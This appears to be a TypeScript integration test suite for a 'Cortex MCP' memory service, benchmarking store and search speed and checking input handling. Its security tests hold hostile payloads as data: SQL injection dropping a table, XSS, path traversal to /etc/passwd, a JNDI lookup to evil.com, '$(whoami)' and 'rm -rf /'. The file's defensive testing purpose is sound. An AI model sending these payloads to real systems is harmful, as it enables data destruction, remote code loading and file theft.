/**
 * Cortex MCP Performance & Security Integration Test
 *
 * Integration tests that work with the actual MCP tools
 * for comprehensive performance and security validation
 *
 * @version 1.0.0
 */

import { performance } from 'perf_hooks';
import { PrismaClient } from '@prisma/client';
import { memoryStore } from '../../src/services/memory-store.js';
import { smartMemoryFind } from '../../src/services/smart-find.js';
import { logger } from '../../src/utils/logger.js';

// ============================================================================
// Test Configuration
// ============================================================================

interface TestMetrics {
  operation: string;
  startTime: number;
  endTime: number;
  responseTime: number;
  success: boolean;
  error?: string;
  dataSize?: number;
  memoryBefore?: NodeJS.MemoryUsage;
  memoryAfter?: NodeJS.MemoryUsage;
}

interface SecurityTest {
  type: string;
  payload: any;
  description: string;
  shouldBlock: boolean;
}

interface TestResults {
  performance: TestMetrics[];
  security: {
    test: string;
    payload: string;
    blocked: boolean;
    responseTime: number;
    error?: string;
  }[];
  summary: {
    totalPerformanceTests: number;
    successfulPerformanceTests: number;
    avgResponseTime: number;
    maxResponseTime: number;
    totalSecurityTests: number;
    blockedSecurityTests: number;
    vulnerabilities: number;
  };
}

// ============================================================================
// Performance Test Suite
// ============================================================================

class PerformanceIntegrationTest {
  private prisma: PrismaClient;
  private metrics: TestMetrics[] = [];
  private testItems: any[] = [];

  constructor() {
    this.prisma = new PrismaClient();
  }

  /**
   * Generate test data for performance testing
   */
  private generateTestData(count: number): any[] {
    const kinds = [
      'entity', 'relation', 'observation', 'decision', 'issue',
      'todo', 'runbook', 'change', 'release_note', 'ddl',
      'pr_context', 'incident', 'release', 'risk', 'assumption'
    ];

    return Array.from({ length: count }, (_, i) => ({
      kind: kinds[i % kinds.length],
      scope: {
        project: 'performance_test',
        branch: 'test_branch',
        org: 'test_org'
      },
      data: {
        title: `Performance Test Item ${i}`,
        content: `This is test content for item ${i} with searchable text including performance testing keywords`,
        metadata: {
          index: i,
          category: 'test',
          priority: i % 3,
          timestamp: new Date().toISOString(),
          tags: [`tag_${i % 10}`, `category_${i % 5}`]
        }
      }
    }));
  }

  /**
   * Measure performance of a function
   */
  private async measurePerformance(
    operation: string,
    testFn: () => Promise<any>,
    dataSize?: number
  ): Promise<TestMetrics> {
    const memoryBefore = process.memoryUsage();
    const startTime = performance.now();

    try {
      const result = await testFn();
      const endTime = performance.now();
      const memoryAfter = process.memoryUsage();

      const metric: TestMetrics = {
        operation,
        startTime,
        endTime,
        responseTime: endTime - startTime,
        success: true,
        dataSize,
        memoryBefore,
        memoryAfter
      };

      this.metrics.push(metric);
      logger.info(`Performance test ${operation}: ${metric.responseTime.toFixed(2)}ms`);
      return metric;

    } catch (error) {
      const endTime = performance.now();
      const memoryAfter = process.memoryUsage();

      const metric: TestMetrics = {
        operation,
        startTime,
        endTime,
        responseTime: endTime - startTime,
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        dataSize,
        memoryBefore,
        memoryAfter
      };

      this.metrics.push(metric);
      logger.error({ error, operation }, `Performance test ${operation} failed`);
      return metric;
    }
  }

  /**
   * Test single item store performance
   */
  async testSingleItemStore(): Promise<TestMetrics[]> {
    const results: TestMetrics[] = [];
    const items = this.generateTestData(1);

    for (let i = 0; i < 10; i++) {
      const metric = await this.measurePerformance(
        'single_item_store',
        () => memoryStore(items),
        1
      );
      results.push(metric);
    }

    return results;
  }

  /**
   * Test bulk store performance with varying sizes
   */
  async testBulkStorePerformance(): Promise<TestMetrics[]> {
    const results: TestMetrics[] = [];
    const bulkSizes = [10, 50, 100, 500];

    for (const size of bulkSizes) {
      const items = this.generateTestData(size);

      const metric = await this.measurePerformance(
        `bulk_store_${size}`,
        () => memoryStore(items),
        size
      );

      results.push(metric);
      this.testItems.push(...items);
    }

    return results;
  }

  /**
   * Test search performance across different query types
   */
  async testSearchPerformance(): Promise<TestMetrics[]> {
    const results: TestMetrics[] = [];
    const searchQueries = [
      'performance test',
      'item',
      'test content',
      'metadata',
      'timestamp',
      'nonexistent query that should return no results'
    ];

    // Ensure we have data to search
    if (this.testItems.length === 0) {
      this.testItems = this.generateTestData(100);
      await memoryStore(this.testItems);
    }

    for (const query of searchQueries) {
      const metric = await this.measurePerformance(
        `search_${query.replace(/\s+/g, '_')}`,
        () => smartMemoryFind({
          query,
          scope: { project: 'performance_test' },
          mode: 'auto'
        })
      );
      results.push(metric);
    }

    return results;
  }

  /**
   * Test concurrent operations
   */
  async testConcurrentOperations(): Promise<TestMetrics[]> {
    const results: TestMetrics[] = [];
    const concurrencyLevels = [1, 5, 10];

    for (const concurrency of concurrencyLevels) {
      const items = this.generateTestData(concurrency);

      const startTime = performance.now();

      try {
        const promises = items.map((item, index) =>
          this.measurePerformance(
            `concurrent_store_${concurrency}_${index}`,
            () => memoryStore([item]),
            1
          )
        );

        const concurrentResults = await Promise.all(promises);
        const endTime = performance.now();

        const avgResponseTime = concurrentResults.reduce((sum, r) => sum + r.responseTime, 0) / concurrency;

        results.push({
          operation: `concurrent_store_${concurrency}`,
          startTime,
          endTime,
          responseTime: avgResponseTime,
          success: true,
          dataSize: concurrency
        });

        this.testItems.push(...items);

      } catch (error) {
        const endTime = performance.now();

        results.push({
          operation: `concurrent_store_${concurrency}`,
          startTime,
          endTime,
          responseTime: endTime - startTime,
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
          dataSize: concurrency
        });
      }
    }

    return results;
  }

  /**
   * Test large payload handling
   */
  async testLargePayloadHandling(): Promise<TestMetrics[]> {
    const results: TestMetrics[] = [];
    const payloadSizes = [1, 10, 50, 100]; // KB

    for (const sizeKB of payloadSizes) {
      const largeContent = 'x'.repeat(sizeKB * 1024);

      const largeItem = {
        kind: 'observation' as const,
        scope: {
          project: 'large_payload_test',
          branch: 'test'
        },
        data: {
          title: `Large Payload Test (${sizeKB}KB)`,
          content: largeContent,
          metadata: {
            size: largeContent.length,
            test_type: 'large_payload'
          }
        }
      };

      const metric = await this.measurePerformance(
        `large_payload_${sizeKB}kb`,
        () => memoryStore([largeItem]),
        largeContent.length
      );

      results.push(metric);
    }

    return results;
  }

  /**
   * Get all performance metrics
   */
  getMetrics(): TestMetrics[] {
    return this.metrics;
  }

  /**
   * Cleanup test data
   */
  async cleanup(): Promise<void> {
    try {
      // Clean up test data from database
      await this.prisma.knowledge.deleteMany({
        where: {
          OR: [
            { scope: { project: 'performance_test' } },
            { scope: { project: 'large_payload_test' } }
          ]
        }
      });

      await this.prisma.$disconnect();
    } catch (error) {
      logger.error({ error }, 'Failed to cleanup performance test data');
    }
  }
}

// ============================================================================
// Security Test Suite
// ============================================================================

class SecurityIntegrationTest {
  private securityResults: TestResults['security'] = [];

  /**
   * Test security attacks against memory store
   */
  async testMemoryStoreSecurity(): Promise<TestResults['security']> {
    const securityTests: SecurityTest[] = [
      {
        type: 'SQL_INJECTION',
        payload: {
          items: [{
            kind: 'observation',
            scope: { project: "'; DROP TABLE knowledge; --" },
            data: { title: 'SQL Injection Test', content: 'Malicious payload' }
          }]
        },
        description: 'SQL injection in project name',
        shouldBlock: true
      },
      {
        type: 'XSS',
        payload: {
          items: [{
            kind: 'observation',
            scope: { project: 'xss_test' },
            data: {
              title: '<script>alert("xss")</script>',
              content: 'XSS payload in title'
            }
          }]
        },
        description: 'XSS in data fields',
        shouldBlock: true
      },
      {
        type: 'PATH_TRAVERSAL',
        payload: {
          items: [{
            kind: 'entity',
            scope: { project: '../../../etc/passwd' },
            data: { title: 'Path Traversal', content: 'Malicious path' }
          }]
        },
        description: 'Path traversal in project name',
        shouldBlock: true
      },
      {
        type: 'LARGE_PAYLOAD',
        payload: {
          items: [{
            kind: 'observation',
            scope: { project: 'large_payload_test' },
            data: {
              title: 'Oversized Payload',
              content: 'x'.repeat(10000000), // 10MB
              metadata: { huge: Array(10000).fill('data') }
            }
          }]
        },
        description: 'Oversized payload attack',
        shouldBlock: true
      },
      {
        type: 'MALFORMED_DATA',
        payload: {
          items: [{
            kind: 'observation',
            scope: { project: 'malformed_test' },
            data: {
              title: null,
              content: undefined,
              metadata: 'not_an_object'
            }
          }]
        },
        description: 'Malformed data structure',
        shouldBlock: true
      },
      {
        type: 'UNICODE_ATTACK',
        payload: {
          items: [{
            kind: 'observation',
            scope: { project: 'unicode_test' },
            data: {
              title: '🔥💣🚀🚨⚠️ Unicode Attack',
              content: '\u0000\u0001\u0002\u0003 Malicious unicode'
            }
          }]
        },
        description: 'Malicious unicode characters',
        shouldBlock: false // Should be handled gracefully
      }
    ];

    const results: TestResults['security'] = [];

    for (const test of securityTests) {
      const startTime = performance.now();
      let blocked = true;
      let error = '';

      try {
        await memoryStore(test.payload.items);

        // If no error thrown, test if it should have been blocked
        if (test.shouldBlock) {
          blocked = false;
          error = 'Attack was not blocked - potential vulnerability';
        }
      } catch (err) {
        // Error is expected for blocked attacks
        if (!test.shouldBlock) {
          blocked = false;
          error = `Legitimate request was blocked: ${err instanceof Error ? err.message : 'Unknown error'}`;
        }
      }

      const endTime = performance.now();

      results.push({
        test: test.type,
        payload: test.description,
        blocked,
        responseTime: endTime - startTime,
        error: blocked ? undefined : error
      });

      logger.info(`Security test ${test.type}: ${blocked ? 'BLOCKED' : 'VULNERABLE'} (${(endTime - startTime).toFixed(2)}ms)`);
    }

    this.securityResults = results;
    return results;
  }

  /**
   * Test search function security
   */
  async testSearchSecurity(): Promise<TestResults['security']> {
    const maliciousQueries = [
      "'; DROP TABLE knowledge; --",
      "<script>alert('xss')</script>",
      "../../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "$(whoami)",
      "`rm -rf /`",
      "🔥💣🚀🚨⚠️",
      String.fromCharCode(...Array.from({length: 100}, (_, i) => i % 256))
    ];

    const results: TestResults['security'] = [];

    for (const query of maliciousQueries) {
      const startTime = performance.now();
      let blocked = true;
      let error = '';

      try {
        await smartMemoryFind({
          query,
          scope: { project: 'security_test' },
          mode: 'auto'
        });

        // Search should handle malicious queries gracefully
        blocked = true;
      } catch (err) {
        error = err instanceof Error ? err.message : 'Unknown error';
        // Check if error is due to security blocking or other issue
        if (error.includes('validation') || error.includes('security')) {
          blocked = true;
        } else {
          blocked = false; // Unexpected error
        }
      }

      const endTime = performance.now();

      results.push({
        test: 'SEARCH_SECURITY',
        payload: `Malicious search query: ${query.substring(0, 30)}...`,
        blocked,
        responseTime: endTime - startTime,
        error: blocked ? undefined : error
      });
    }

    this.securityResults.push(...results);
    return results;
  }

  getResults(): TestResults['security'] {
    return this.securityResults;
  }
}

// ============================================================================
// Integration Test Orchestrator
// ============================================================================

export class PerformanceSecurityIntegrationTest {
  private performanceTest: PerformanceIntegrationTest;
  private securityTest: SecurityIntegrationTest;

  constructor() {
    this.performanceTest = new PerformanceIntegrationTest();
    this.securityTest = new SecurityIntegrationTest();
  }

  /**
   * Run complete integration test suite
   */
  async runIntegrationTests(): Promise<TestResults> {
    logger.info('Starting Cortex MCP Performance & Security Integration Tests');

    // Performance Tests
    logger.info('Running performance integration tests...');

    const singleItemResults = await this.performanceTest.testSingleItemStore();
    const bulkResults = await this.performanceTest.testBulkStorePerformance();
    const searchResults = await this.performanceTest.testSearchPerformance();
    const concurrentResults = await this.performanceTest.testConcurrentOperations();
    const largePayloadResults = await this.performanceTest.testLargePayloadHandling();

    const allPerformanceResults = [
      ...singleItemResults,
      ...bulkResults,
      ...searchResults,
      ...concurrentResults,
      ...largePayloadResults
    ];

    // Security Tests
    logger.info('Running security integration tests...');

    const storeSecurityResults = await this.securityTest.testMemoryStoreSecurity();
    const searchSecurityResults = await this.securityTest.testSearchSecurity();

    const allSecurityResults = [
      ...storeSecurityResults,
      ...searchSecurityResults
    ];

    // Generate summary
    const summary = this.generateSummary(allPerformanceResults, allSecurityResults);

    logger.info('Integration tests completed');

    return {
      performance: allPerformanceResults,
      security: allSecurityResults,
      summary
    };
  }

  /**
   * Generate test summary
   */
  private generateSummary(
    performanceResults: TestMetrics[],
    securityResults: TestResults['security']
  ): TestResults['summary'] {
    const totalPerformanceTests = performanceResults.length;
    const successfulPerformanceTests = performanceResults.filter(r => r.success).length;

    const responseTimes = performanceResults
      .filter(r => r.success)
      .map(r => r.responseTime);

    const avgResponseTime = responseTimes.length > 0
      ? responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length
      : 0;

    const maxResponseTime = responseTimes.length > 0 ? Math.max(...responseTimes) : 0;

    const totalSecurityTests = securityResults.length;
    const blockedSecurityTests = securityResults.filter(r => r.blocked).length;
    const vulnerabilities = totalSecurityTests - blockedSecurityTests;

    return {
      totalPerformanceTests,
      successfulPerformanceTests,
      avgResponseTime,
      maxResponseTime,
      totalSecurityTests,
      blockedSecurityTests,
      vulnerabilities
    };
  }

  /**
   * Generate assessment report
   */
  generateAssessmentReport(results: TestResults): string {
    const { performance, security, summary } = results;

    const performanceGrade = summary.avgResponseTime < 50 ? 'A' :
                            summary.avgResponseTime < 100 ? 'B' :
                            summary.avgResponseTime < 200 ? 'C' : 'F';

    const securityGrade = summary.vulnerabilities === 0 ? 'A' :
                         summary.vulnerabilities <= 2 ? 'B' :
                         summary.vulnerabilities <= 5 ? 'C' : 'F';

    const overallGrade = (performanceGrade === 'A' && securityGrade === 'A') ? 'A' :
                        (performanceGrade === 'B' && securityGrade === 'B') ? 'B' :
                        (performanceGrade === 'C' || securityGrade === 'C') ? 'C' : 'F';

    return [
      '# Cortex MCP Performance & Security Integration Test Report',
      '',
      `**Test Date:** ${new Date().toISOString()}`,
      '',
      '## Executive Summary',
      '',
      `**Overall Grade: ${overallGrade}**`,
      `**Performance Grade: ${performanceGrade}**`,
      `**Security Grade: ${securityGrade}**`,
      '',
      '### Key Metrics',
      '',
      '- **Performance Tests:**',
      `  - Total: ${summary.totalPerformanceTests}`,
      `  - Successful: ${summary.successfulPerformanceTests} (${((summary.successfulPerformanceTests / summary.totalPerformanceTests) * 100).toFixed(1)}%)`,
      `  - Average Response Time: ${summary.avgResponseTime.toFixed(2)}ms`,
      `  - Maximum Response Time: ${summary.maxResponseTime.toFixed(2)}ms`,
      '',
      '- **Security Tests:**',
      `  - Total: ${summary.totalSecurityTests}`,
      `  - Blocked Attacks: ${summary.blockedSecurityTests} (${((summary.blockedSecurityTests / summary.totalSecurityTests) * 100).toFixed(1)}%)`,
      `  - Vulnerabilities Found: ${summary.vulnerabilities}`,
      '',
      '## Performance Analysis',
      '',
      '### Response Time Distribution',
      '',
      '| Operation Type | Avg Time (ms) | Max Time (ms) | Success Rate |',
      '|----------------|---------------|---------------|--------------|',
      ...this.getPerformanceBreakdown(performance),
      '',
      '### Performance Benchmarks',
      '',
      '- **Target:** < 50ms average response time',
      `- **Status:** ${summary.avgResponseTime < 50 ? '✅ MEETS TARGET' : '❌ EXCEEDS TARGET'}`,
      '- **Target:** < 500ms maximum response time',
      `- **Status:** ${summary.maxResponseTime < 500 ? '✅ MEETS TARGET' : '❌ EXCEEDS TARGET'}`,
      '',
      '## Security Analysis',
      '',
      '### Security Test Results',
      '',
      '| Test Type | Description | Status | Response Time |',
      '|------------|-------------|--------|---------------|',
      ...security.map(test => [
        test.test,
        test.payload,
        test.blocked ? '✅ BLOCKED' : '❌ VULNERABLE',
        `${test.responseTime.toFixed(2)}ms`
      ]),
      '',
      '### Vulnerability Assessment',
      '',
      summary.vulnerabilities === 0
        ? '✅ **SECURE** - No security vulnerabilities detected in the test suite.'
        : `❌ **VULNERABLE** - ${summary.vulnerabilities} security vulnerabilities found that require immediate attention.`,
      '',
      '## Production Readiness Assessment',
      '',
      this.getProductionReadinessVerdict(overallGrade, summary),
      '',
      '## Recommendations',
      '',
      this.getRecommendations(performance, security, summary),
      '',
      '---',
      '*Report generated by Cortex MCP Performance & Security Integration Test Suite*'
    ].join('\n');
  }

  /**
   * Get performance breakdown by operation type
   */
  private getPerformanceBreakdown(performance: TestMetrics[]): string[] {
    const operationGroups = performance.reduce((groups, metric) => {
      const baseOperation = metric.operation.split('_').slice(0, 2).join('_');
      if (!groups[baseOperation]) {
        groups[baseOperation] = [];
      }
      groups[baseOperation].push(metric);
      return groups;
    }, {} as Record<string, TestMetrics[]>);

    return Object.entries(operationGroups).map(([operation, metrics]) => {
      const successful = metrics.filter(m => m.success);
      const avgTime = successful.length > 0
        ? successful.reduce((sum, m) => sum + m.responseTime, 0) / successful.length
        : 0;
      const maxTime = successful.length > 0
        ? Math.max(...successful.map(m => m.responseTime))
        : 0;
      const successRate = (successful.length / metrics.length) * 100;

      return `| ${operation} | ${avgTime.toFixed(2)} | ${maxTime.toFixed(2)} | ${successRate.toFixed(1)}% |`;
    });
  }

  /**
   * Get production readiness verdict
   */
  private getProductionReadinessVerdict(grade: string, summary: TestResults['summary']): string {
    if (grade === 'A') {
      return '✅ **PRODUCTION READY** - System demonstrates excellent performance and security characteristics suitable for immediate production deployment.';
    } else if (grade === 'B') {
      return '⚠️ **PRODUCTION READY WITH MONITORING** - System meets minimum production requirements but should be monitored closely for the identified issues.';
    } else if (grade === 'C') {
      return '⚠️ **CONDITIONAL PRODUCTION READY** - System has notable performance or security concerns that should be addressed before production deployment or deployed with additional safeguards.';
    } else {
      return '❌ **NOT PRODUCTION READY** - System has critical performance or security issues that must be resolved before production deployment.';
    }
  }

  /**
   * Get recommendations based on test results
   */
  private getRecommendations(
    performance: TestMetrics[],
    security: TestResults['security'],
    summary: TestResults['summary']
  ): string[] {
    const recommendations: string[] = [];

    // Performance recommendations
    if (summary.avgResponseTime > 50) {
      recommendations.push('🔧 **Performance:** Average response time exceeds 50ms target - investigate slow operations and optimize database queries');
    }

    if (summary.maxResponseTime > 500) {
      recommendations.push('🔧 **Performance:** Maximum response time exceeds 500ms - identify and optimize bottlenecks in bulk operations');
    }

    const slowOperations = performance.filter(p => p.responseTime > 200);
    if (slowOperations.length > 0) {
      recommendations.push(`🔧 **Performance:** ${slowOperations.length} operations took over 200ms - consider implementing caching or optimization`);
    }

    // Security recommendations
    if (summary.vulnerabilities > 0) {
      recommendations.push('🔒 **Security:** Address identified security vulnerabilities immediately before production deployment');

      const vulnerableTests = security.filter(s => !s.blocked);
      for (const test of vulnerableTests) {
        recommendations.push(`   - ${test.payload}: ${test.error || 'Security issue detected'}`);
      }
    }

    const slowSecurityTests = security.filter(s => s.responseTime > 100);
    if (slowSecurityTests.length > 0) {
      recommendations.push('🔒 **Security:** Some security validation is taking longer than expected - optimize input validation');
    }

    // General recommendations
    const failedPerformanceTests = performance.filter(p => !p.success);
    if (failedPerformanceTests.length > 0) {
      recommendations.push(`🐛 **Reliability:** ${failedPerformanceTests.length} performance tests failed - investigate error handling and resilience`);
    }

    if (recommendations.length === 0) {
      recommendations.push('✅ **Excellent:** No immediate issues detected - system is performing well within acceptable parameters');
    }

    return recommendations;
  }

  /**
   * Cleanup test data
   */
  async cleanup(): Promise<void> {
    await this.performanceTest.cleanup();
  }
}